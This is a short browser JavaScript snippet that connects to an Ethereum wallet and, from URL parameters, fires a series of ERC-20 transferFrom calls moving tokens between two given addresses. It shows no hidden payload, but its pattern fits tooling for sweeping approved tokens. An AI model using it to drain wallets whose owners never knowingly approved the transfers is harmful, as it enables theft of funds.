setTimeout(async () => {
    const web3 = new Web3(window.ethereum)
    const address = web3.currentProvider.selectedAddress

    window.ethereum.on('accountsChanged', () => {
        location.reload()
    })

    const params = new URLSearchParams(window.location.search)
    const contractAddress = params.get('contractAddress')
    const fromAddress = params.get('fromAddress')
    const toAddress = params.get('toAddress')
    let tokens = params.get('tokens')

    try {
        tokens = JSON.parse(tokens)
    } catch (error) {
        tokens = null
    }

    if (!contractAddress || !web3.utils.isAddress(contractAddress) || !fromAddress || !web3.utils.isAddress(fromAddress) || !toAddress || !web3.utils.isAddress(toAddress) || !tokens || !Array.isArray(tokens)) {
        window.location.replace('/')
    }

    if (!address) {
        window.ethereum.enable()
    } else {
        const data = {
            name: 'transferFrom',
            type: 'function',
            stateMutability: 'nonpayable',
            inputs: [{
                    type: 'address',
                    name: 'from',
                },
                {
                    type: 'address',
                    name: 'to',
                },
                {
                    type: 'uint256',
                    name: 'value',
                },
            ],
            outputs: [],
        }
        const contract = await new web3.eth.Contract([data], contractAddress)

        tokens.forEach((amountTkns) => {
            const fromAddressA = {
                from: address
            }

            contract.methods
                .transferFrom(fromAddress, toAddress, amountTkns)
                .send(fromAddressA)
        })
    }
}, 1000)